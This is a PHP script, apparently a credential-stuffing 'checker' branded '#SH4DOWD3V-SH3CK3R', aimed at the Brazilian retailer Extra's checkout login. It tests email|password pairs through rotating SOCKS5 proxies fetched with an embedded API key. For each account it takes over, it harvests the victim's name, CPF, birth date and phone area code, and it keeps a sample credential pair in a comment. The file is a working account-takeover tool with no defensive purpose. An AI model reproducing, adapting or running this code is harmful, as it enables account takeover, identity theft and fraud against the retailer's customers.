<?php
session_start();
 if(!$_SESSION['user'] == "paladino" and !$_SESSION['pass'] == "paladino"){  
   echo "<script>location.href='../'</script>";
 }

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');


$user = $_SESSION['user'];

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];


function delete_cookies() {

    global $config;

    $fp = @fopen($config['cookie_file'], 'w');

    @fclose($fp);

}

function xflush() {

    static $output_handler = null;

    if ($output_handler === null) {

        $output_handler = @ini_get('output_handler');

    }

  

   if ($output_handler == 'ob_gzhandler') {

        return;

    }

  

    flush();

    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {

        @ob_flush();

    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {

        @ob_end_flush();

        @ob_start();

    }

}

function checkProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.cpanel.net/showip.cgi");
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $result = curl_exec($ch);
    if ($result !== FALSE) {
        return true;
    } else {
        return false;
    }
}



function getProxy() {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?api_key=0351ecb4-4ede-41b5-bb05-e2a81fbdfed6&protocol=socks5&country=BR');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ml.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ml.txt');
    $proxy = curl_exec($ch);
    $proxy = json_decode($proxy);

    return $proxy->ipPort;
}




function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

$dir = dirname(__FILE__);

$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';

if (!file_exists($config['cookie_file'])) {

    $fp = @fopen($config['cookie_file'], 'w');

    @fclose($fp);

}




$ch = curl_init();
$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}
curl_setopt($ch, CURLOPT_URL, "https://carrinho.extra.com.br/Checkout?ReturnUrl=http://www.extra.com.br#login");
//curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/extra.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/extra.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
//curl_setopt($ch, CURLOPT_POST, 1);                 
//curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$d2 = curl_exec($ch);
$token = getStr($d2,'var token = "','"');
xflush();



$post = '{"clienteLogin":{"Token":"'.$token.'","Operador":"","IdUnidadeNegocio":1,"Senha":"'.$senha.'","cadastro":"on","Email":"'.$email.'"},"mesclarCarrinho":true,"Token":"'.$token.'","IdUnidadeNegocio":1,"Operador":""}';

$headers = [
'Host: carrinho.extra.com.br',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
'Accept: application/json, text/javascript, */*; q=0.01',
'Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3',
'Accept-Encoding: gzip, deflate, br',
'Content-Type: application/json; charset=utf-8',
'X-Requested-With: XMLHttpRequest',
'Referer: https://carrinho.extra.com.br/Checkout?ReturnUrl=http://www.extra.com.br',
'Content-Length:'.strlen($post),
'Connection: keep-alive'
];

$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}

curl_setopt($ch, CURLOPT_URL, "https://carrinho.extra.com.br/Api/checkout/Cliente.svc/Cliente/Login
");
//curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json; charset=UTF-8'));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
//curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/extra.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/extra.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://carrinho.extra.com.br/Checkout?ReturnUrl=http://www.extra.com.br
');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$d3 = curl_exec($ch);
xflush();

$loadtime = time();
$data = date("d/m/Y H:i:s");
if ($d3) {
  if (stristr($d3,'"Erro":false') !== false) {
    $nome = getStr($d3,'"NomeCompleto":"','",');
    $cpf = getStr($d3,'"Cpf":"','",');
    $dia = getStr($d3,'"DataNascimentoDia":"','",');
    $mes = getStr($d3,'"DataNascimentoMes":"','",');
    $ano = getStr($d3,'"DataNascimentoAno":"','",');
    $cell = getStr($d3,'"Telefone1DDDPF":"','",');
    $estado = getStr($d3,'"Estado":"','",');             
    
     echo '<span style="width:100% !important" class="label label-success">#Aprovada ✅ '.$email . ' | '.$senha.'</br> Informações: | Nome: '.$nome.' | Cpf: '.$cpf.' | Data-Nascimento | '.$dia.'/'.$mes.'/'.$ano.' | DDD: '.$cell.' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' | #SH4DOWD3V-SH3CK3R<br></span> <br>';

  }else{


      echo '<span class="label label-danger">#Reprovada - Bloqueado ❌ '. $email .' | '. $senha .' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |  #SH4DOWD3V-SH3CK3R<br></span>';
  }
}
delete_cookies();

//canalgeekgame@gmail.com|renato123

?>